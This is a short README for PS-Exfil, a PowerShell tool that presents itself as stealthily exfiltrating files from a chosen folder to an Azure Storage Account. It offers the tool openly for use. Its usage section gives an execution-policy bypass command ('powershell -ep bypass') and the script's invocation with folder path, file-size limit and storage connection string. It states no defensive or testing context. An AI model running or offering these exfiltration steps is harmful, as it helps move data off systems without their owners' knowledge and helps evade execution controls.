# PS-Exfil

<p align="center"> <strong>
 PS-Exfil is a simple PowerShell script designed to automate the process of exfiltrating files to an Azure Storage Account. It operates slowly but stealthy.
 </strong>

## Usage
It's recommended to try and run the tool in a powershell session that can import non-signed scripts. This can be achieved by running 
```powershell
powershell -ep bypass
```
Then to run PS-Exfil
```powershell
.\PS-Exfil.ps1 -folderPath [PATH-TO=EXFIL] -maxFileSize [MAXIMUM-FILE-SIZE-TO-EXFIL] -connectionString [CONNECTION-STRING]
```


## Contact

[@_enigma146](https://twitter.com/_enigma146) - yoabuseini@gmail.com

Project Link: [https://github.com/yanalabuseini/PS-Exfil/tree/main](https://github.com/yanalabuseini/PS-Exfil/tree/main)
